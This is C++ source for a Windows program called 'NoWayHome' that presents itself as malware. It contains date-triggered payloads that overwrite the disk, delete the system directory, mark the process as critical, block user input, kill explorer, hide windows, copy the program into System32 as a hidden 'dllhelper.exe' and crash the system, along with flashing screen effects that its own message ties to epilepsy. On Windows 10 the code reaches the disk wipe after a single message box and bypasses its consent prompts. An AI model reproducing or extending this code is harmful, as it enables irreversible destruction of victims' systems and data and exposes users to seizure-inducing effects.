#include "payloads.h"

static ULONGLONG r, n;
int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }
DWORD WINAPI colours(LPVOID lpstart)
{
	HWND upWnd = GetForegroundWindow();
	HDC upHdc = GetDC(upWnd);
	HDC desktop = GetDC(NULL);
	int xs12 = GetSystemMetrics(SM_CXSCREEN);
	int ys12 = GetSystemMetrics(SM_CYSCREEN);
	while (true) {
		upWnd = GetForegroundWindow();
		upHdc = GetDC(upWnd);
		desktop = GetDC(NULL);
		BitBlt(desktop, -1, 1, xs12, ys12, upHdc, 2, 2, 0x999999);
		Sleep(500);
	}
}
DWORD WINAPI Amazing(LPVOID lpstart) {
	HDC hdc = GetDC(HWND_DESKTOP);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);

	while (true)
	{
		int y = rand() % sh, h = sh - rand() % sh - (sh / 1 - 1);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		BitBlt(hdc, 0, y, sw, h, hdc, rand() % 1 - 1, y, SRCCOPY);
		PatBlt(hdc, -1, y, sw, h, PATINVERT);
		Sleep(rand() % 10);
	}
}
DWORD WINAPI dark(LPVOID lpstart) {
	HDC hdc = GetDC(HWND_DESKTOP);

	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);

	while (1) {
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		BitBlt(hdc, rand() % 2, rand() % 2, rand() % sw, rand() % sh, hdc, rand() % 2, rand() % 2, SRCAND);
		Sleep(3);
	}
}
DWORD WINAPI effect(LPVOID lpstart) {
	HDC hdc = GetDC(0);

	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 12, rand() % 12, SRCCOPY);
	}
}

DWORD WINAPI extreme(LPVOID lpParam)
{
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(0);
	int	h = GetSystemMetrics(1);
	//for (int i = 0;; i++)
	while(true) {
		int(a) = randy() % w, b = randy() % h;
		BitBlt(hdc, a, b, 200, 200, hdc, a + randy() % 21 - 10, b + randy() % 21 - 10, !(randy() & 3) ? 0xEE0086 : 0xCC0020);
	}
}
void March13() {
	SetCriticalProcess();
	OverWriteDisk();
	clean();
	ShellExecuteA(NULL, NULL, "notepad.exe", NULL, NULL, SW_SHOW);
	Sleep(2000);
	infect();
	//HWND hwnd = FindWindow(NULL, L"Notepad");
	//if (!hwnd) {
	//    hwnd = FindWindow(NULL, L"Untitled - Notepad");
	//}
	HWND notepad_handle = NULL;
	while (!notepad_handle) {
		notepad_handle = FindWindow(L"Notepad", NULL);
		Sleep(1000);
	}
	SetForegroundWindow(notepad_handle);
	SetForegroundWindow(notepad_handle);
	SetForegroundWindow(notepad_handle);
	// Resize the Notepad window
	SetWindowPos(notepad_handle, NULL, 0, 0, 800, 600, SWP_NOMOVE);
	BlockInput(true);

	// Wait for the Notepad window to resize
	Sleep(1000);
	SetForegroundWindow(notepad_handle);
	// Set the text to type
	const char* text = "Seems like your bad dream comes true, Friend!.. After Your Computer couldn't withstand\nthe flaming hell unleashed upon it!, you find yourself no longer able to boot into windows,\n What you just withnessed is just a part of a destruction!.., All your drives have been corrupted!..,\nbut you won't complain right? Would you? But you choosed it yourself!.., And this is not my fault. \nNow as I'm ending this computer I'm wishing you good luck! friend!....Bye! \nenjoy the hell unleashed upon your\n computer.";

	// Loop through the text and type each character
	for (int i = 0; i < strlen(text); i++)
	{
		// Set the character to type
		char c = text[i];

		// Create an input event for the character
		INPUT input;
		input.type = INPUT_KEYBOARD;
		input.ki.wVk = 0;
		input.ki.wScan = c;
		input.ki.dwFlags = KEYEVENTF_UNICODE;

		// Send the input event to Notepad
		SendInput(1, &input, sizeof(INPUT));

		// Wait a short amount of time before typing the next character
		Sleep(150);
	}
	BlockInput(false);
	clean();
	CreateThread(0, 0, colours, 0, 0, 0);
	Sleep(20000);
	CreateThread(0, 0, Amazing, 0, 0, 0);
	Sleep(20000);
	CreateThread(0, 0, dark, 0, 0, 0);
	Sleep(30000);
	CreateThread(0, 0, effect, 0, 0, 0);
	Sleep(30000);
	CrashWindows();

}


DWORD WINAPI onceinabluemooneffect(LPVOID lpstart) {
	HDC hdc = GetDC(HWND_DESKTOP);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);


	HDC desk = GetDC(0);
	int xs = GetSystemMetrics(0), ys = GetSystemMetrics(1);
	while (1)
	{


		Sleep(1);
		if (rand() % 3 == 2) {
			HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(desk, brush);
			PatBlt(desk, 0, 0, xs, ys, PATINVERT);
			Sleep(rand() % 1000);
		}
		else if (rand() % 3 == 1) {
			HBRUSH brush = CreateSolidBrush(RGB(rand() % 75, rand() % 75, rand() % 75));
			SelectObject(desk, brush);
			PatBlt(desk, 0, 0, xs, ys, PATINVERT);
			Sleep(rand() % 1000);
		}



		Beep(rand() % 1560, rand() % 1589);




		if (rand() % 25 == 9) {
			HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(desk, brush);

			Sleep(10);
		}
		else if (rand() % 25 == 5) {

			HBRUSH brush = CreateSolidBrush(RGB(rand() % 205, rand() % 205, rand() % 205));
			SelectObject(desk, brush);

			Beep(rand() % 50, rand() % 100);

		}


		if (rand() % 2 == 1) {
			LineTo(desk, rand() % xs, rand() % ys);
			RoundRect(desk, rand() % xs, rand() % ys, rand() % xs, rand() % ys, rand() % xs, rand() % ys);
			Sleep(10);


		}
		if (rand() % 2 == 1) {
			LineTo(desk, rand() % xs, rand() % ys);
			RoundRect(desk, rand() % xs, rand() % ys, rand() % xs, rand() % ys, rand() % xs, rand() % ys);
			Sleep(10);


		}
		else if (rand() % 2 == 2) {
			HDC hdc = GetDC(0);
			int x = GetSystemMetrics(SM_CXSCREEN);
			int y = GetSystemMetrics(SM_CYSCREEN);

			int r1 = rand() % x;
			int r2 = rand() % y;
			HBRUSH hbrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			StretchBlt(hdc, 0, 0, x, r1, hdc, r1, r2, 1, 1, PATINVERT);



		}

		if (rand() % 7 == 5) {

			HDC desk = GetDC(0);
			int xs = GetSystemMetrics(SM_CXSCREEN), ys = GetSystemMetrics(SM_CYSCREEN);

			StretchBlt(desk, rand() % xs, rand() % ys, xs, ys, desk, 0, 0, xs, ys, SRCCOPY);
			StretchBlt(desk, 10, 10, xs - 20, ys - 20, desk, 0, 0, xs, ys, SRCPAINT);
			StretchBlt(desk, -10, -10, xs + 20, ys + 20, desk, 0, 0, xs, ys, SRCPAINT);
			StretchBlt(desk, 0, 0, xs, ys, desk, rand() % xs, rand() % ys, xs, ys, SRCINVERT);
			HBRUSH hbrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(desk, hbrush);
			PatBlt(desk, 0, 0, xs, ys, PATINVERT);


		}
		for (int i = 0; i++, i %= 5;) {
			HGDIOBJ hbrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(desk, hbrush);
			BitBlt(desk, rand() % 10, rand() % 10, xs, ys, desk, rand() % 10, rand() % 10, 0x98123c);
		}
		RECT rekt;

		for (int i = 0; i++, i %= 5;) {
			HGDIOBJ hbrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(desk, hbrush);
			BitBlt(desk, rand() % 10, rand() % 10, xs, ys, desk, rand() % 10, rand() % 10, 0x98123c);
			Sleep(100);
		}

		int y = rand() % sh, h = sh - rand() % sh - (sh / 1 - 1);

		BitBlt(hdc, 0, y, sw, h, hdc, rand() % 1 - 1, y, SRCCOPY);
		PatBlt(hdc, -1, y, sw, h, PATINVERT);
		Sleep(rand() % 10);

		if (rand() % 5 == 1) {
			StretchBlt(desk, -10, -10, xs + 20, ys + 20, desk, 0, 0, xs, ys, SRCCOPY);
			Sleep(rand() % 1000);

		}

		HDC hDsktp;
		HWND hWnd;
		RECT wRect;
		POINT wPt[3];
		int counter = 10;

		HWND upWnd = GetForegroundWindow();
		HDC upHdc = GetDC(upWnd);
		HDC desktop = GetDC(NULL);


		int x = GetSystemMetrics(SM_CXSCREEN);


		int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR nCmdLine, int nCmdShow);
		HDC hDc = GetWindowDC(GetDesktopWindow());

		Beep(rand() % 1560, rand() % 1589);



		BitBlt(hdc, rand() % 15, rand() % 15, rand() % sw, rand() % sh, hdc, rand() % 15, rand() % 5, SRCCOPY);
		BitBlt(hdc, rand() % 15, rand() % 15, rand() % sw, rand() % sh, hdc, rand() % 15, rand() % 5, SRCAND);


		Sleep(100);
		upWnd = GetForegroundWindow();
		upHdc = GetDC(upWnd);
		desktop = GetDC(NULL);
		BitBlt(desktop, -1, 1, xs, ys, upHdc, 2, 2, 0x999999);

		HWND hwnd = GetDesktopWindow();
		HDC hdc = GetWindowDC(hwnd);
		RECT rect;
		GetWindowRect(hwnd, &rect);
		int w = rect.right - rect.left;



		BitBlt(hdc, rand() % 5, rand() % 5, rand() % sw, rand() % sh, hdc, rand() % 5, rand() % 5, SRCCOPY);

		int sx = 0, sy = 0;
		LPCWSTR lpText = L"                                                                                                                                                                                                                                                             ";

		int xs = GetSystemMetrics(SM_CXSCREEN);
		int ys = GetSystemMetrics(SM_CYSCREEN);
		BitBlt(desktop, 0, 0, xs, ys, upHdc, 0, 0, PATINVERT);

		HWND desktoq = GetDesktopWindow();

		GetWindowRect(desktoq, &rect);

		StretchBlt(desktop, 50, 50, w - 100, h - 100, desktop, 0, 0, w, h, SRCCOPY);
		Sleep(300);

		hdc = GetWindowDC(GetDesktopWindow());
		sx = GetSystemMetrics(0);
		sy = GetSystemMetrics(1);
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
		Sleep(10);
	}
}
DWORD WINAPI hide(LPVOID lpstart) {
	while (1)
	{
		HWND hWnd = GetForegroundWindow();
		ShowWindow(hWnd, SW_HIDE);
		Sleep(50);
	}
}
DWORD WINAPI invers(LPVOID lpstart)
{
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);
	while (1)
	{
		BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, NOTSRCCOPY);
		Sleep(2000);
	}
}
void January9() {
	SetCriticalProcess();
	clean();
	MessageBoxA(NULL, "PLS WAIT until all your windows are hidden and\n you have no were to go and then when it happens\n you are alone friend!.., but waiting for sometime might help i guess?\n 30 seconds?\n OOPS!!", "ERROR!", MB_ICONERROR);
	HANDLE hide1 = CreateThread(0, 0, hide, 0, 0, 0);
	Sleep(30000);
	TerminateThread(hide1, 0);
	clean();
	ShellExecuteA(NULL, NULL, "cmd /c taskkill /f /im explorer.exe && explorer", NULL, NULL, SW_HIDE);
	Sleep(1000);
	CreateThread(0, 0, onceinabluemooneffect, 0, 0, 0);
	Sleep(90000);
	CreateThread(0, 0, dark, 0, 0, 0);
	Sleep(30000);
	CrashWindows();
}
void march4() {
	SetCriticalProcess();
	if (MessageBoxA(NULL, "Do you suffer from epilepsy?\n if yes escape now!!!\n you have no time friend!!!\n if no enjoy!!", "ERROR!", MB_YESNO | MB_ICONEXCLAMATION) == IDYES) {
		HANDLE inversthread = CreateThread(0, 0, invers, 0, 0, 0);
		clean();
		Sleep(30000);
		TerminateThread(inversthread, 0);
		CreateThread(0, 0, onceinabluemooneffect, 0, 0, 0);
		Sleep(120000);
		CrashWindows();
	}
	else {
		MessageBoxA(NULL, "OK I WILL SAVE YOU BY CRASHING YOUR COMPUTER", "SAVED!", MB_ICONHAND);
		CrashWindows();
	}
}
//all payloads combined slowly!
void December24() {
	SetCriticalProcess();
	CreateThread(0, 0, colours, 0, 0, 0);
	Sleep(20000);
	HANDLE Amazingthread = CreateThread(0, 0, Amazing, 0, 0, 0);
	Sleep(20000);
	TerminateThread(Amazingthread, 0);
	CreateThread(0, 0, dark, 0, 0, 0);
	Sleep(30000);
	HANDLE effecthread = CreateThread(0, 0, effect, 0, 0, 0);
	Sleep(30000);
	TerminateThread(effecthread, 0);
	CreateThread(0, 0, onceinabluemooneffect, 0, 0, 0);
	Sleep(90000);
	HANDLE hide1 = CreateThread(0, 0, hide, 0, 0, 0);
	Sleep(30000);
	TerminateThread(hide1, 0);
	CrashWindows();
}
DWORD WINAPI move(LPVOID lpstart) {
	HWND  hwndParent = ::FindWindowA("Progman", "Program Manager");
	HWND  hwndSHELLDLL_DefView = ::FindWindowEx(hwndParent, NULL, L"SHELLDLL_DefView", NULL);
	HWND  hwndSysListView32 = ::FindWindowEx(hwndSHELLDLL_DefView, NULL, L"SysListView32", L"FolderView");

	int Nm = ListView_GetItemCount(hwndSysListView32);

	int sNm = 360 / Nm;

	int x = 0, y = 0;
	int speedx = 30;
	int speedy = 30;
	int i = 0;
	while (true)
	{
		x += speedx;
		y += speedy;
		if (x > 1920 + 1920 - 50 / 2)
			speedx = -30;
		if (x < 0)
			speedx = 30;
		if (y > 1080 - 50 / 2)
			speedy = -30;
		if (y < 0)
			speedy = 30;

		if (i < Nm)
			i++;
		else
			i = 0;

		::SendMessage(hwndSysListView32, LVM_SETITEMPOSITION, i, MAKELPARAM(x, y));
		ListView_RedrawItems(hwndSysListView32, i, i + 1);
		//		ListView_RedrawItems(hwndSysListView32, 0, ListView_GetItemCount(hwndSysListView32) - 1);
		::UpdateWindow(hwndSysListView32);
		Sleep(50);
	}
}
void January24() {
	SetCriticalProcess();
	//special date..
	HANDLE exteremethread = CreateThread(0, 0, extreme, 0, 0, 0);
	Sleep(60000);
	TerminateThread(exteremethread, 0);
	CreateThread(0, 0, onceinabluemooneffect, 0, 0, 0);
	Sleep(90000);
	WCHAR SystemDirectory[MAX_PATH] = { 0 };
	GetSystemDirectory(SystemDirectory, MAX_PATH);

	OverWriteDisk(); //see if you can recover?
	DestroyDirectory(SystemDirectory);
	CrashWindows();
}

void setup() {
	if (MessageBoxA(NULL, "ahh.. you executed MALWARE!\r\n\This malware will harm your computer and makes it unusable.\r\n\simply press No and nothing will happen.\r\n\If you know what this malware does and are using a safe environment to test, \press Yes to start it.\r\n\r\n\DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", "NoWayHome", MB_YESNO | MB_ICONWARNING) != IDYES ||
		MessageBoxA(NULL, "THIS IS THE LAST WARNING!\r\n\r\n\THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\STILL EXECUTE IT?", "NoWayHome", MB_YESNO | MB_ICONWARNING) != IDYES) {
		ExitProcess(0);
	}
	char system[MAX_PATH];
	char pathtofile[MAX_PATH];
	HMODULE GetModH = GetModuleHandleA(NULL);
	GetModuleFileNameA(GetModH, pathtofile, sizeof(pathtofile));
	GetSystemDirectoryA(system, sizeof(system));
	strcat(system, "\\dllhelper.exe");
	CopyFileA(pathtofile, system, false);
	SetFileAttributes(L"C:\\Windows\\System32\\dllhelper.exe", FILE_ATTRIBUTE_SYSTEM || FILE_ATTRIBUTE_HIDDEN);
	all();
	CrashWindowswithbeef();
}
BOOL GetOsVersion()
{
	wchar_t path[200] = L"C:\\Windows\\System32\\kernel32.dll";
	DWORD dwDummy;
	DWORD dwFVISize = GetFileVersionInfoSize(path, &dwDummy);
	LPBYTE lpVersionInfo = new BYTE[dwFVISize];
	if (GetFileVersionInfo(path, 0, dwFVISize, lpVersionInfo) == 0)
	{
		return FALSE;
	}

	UINT uLen;
	VS_FIXEDFILEINFO* lpFfi;
	BOOL bVer = VerQueryValue(lpVersionInfo, L"\\", (LPVOID*)&lpFfi, &uLen);

	if (!bVer || uLen == 0)
	{
		return FALSE;
	}
	DWORD dwProductVersionMS = lpFfi->dwProductVersionMS;
	if (HIWORD(dwProductVersionMS) == 10 && LOWORD(dwProductVersionMS) == 0)
	{
		MessageBoxA(NULL, "YOU RAN ME IN WINDOWS 10!!!!!! OR ABOVE!!!, NOW I'M GONNA DESTROY YOUR COMPUTER!!!\nIF YOU WANT TO ESCAPE FORCE RESTART YOUR COMPUTER AND DON'T PRESS THE 'OK' BUTTON", "ERROR", MB_ICONERROR);
		WCHAR SystemDirectory[MAX_PATH] = { 0 };
		GetSystemDirectory(SystemDirectory, MAX_PATH);

		OverWriteDisk(); //see if you can recover?
		DestroyDirectory(SystemDirectory);
	}
	else {
		setup();
	}
	//else if (HIWORD(dwProductVersionMS) == 6 && LOWORD(dwProductVersionMS) == 3)
	//{
	//   n_ s
	//}
	//else if (HIWORD(dwProductVersionMS) == 6 && LOWORD(dwProductVersionMS) == 2)
	//{
	//    std::cout << "this is windows 8\n";
	//}
	//else if (HIWORD(dwProductVersionMS) == 6 && LOWORD(dwProductVersionMS) == 1)
	//{
	//    std::cout << "this is windows 7 or Windows Server 2008 R2\n";
	//}
	return TRUE;
}

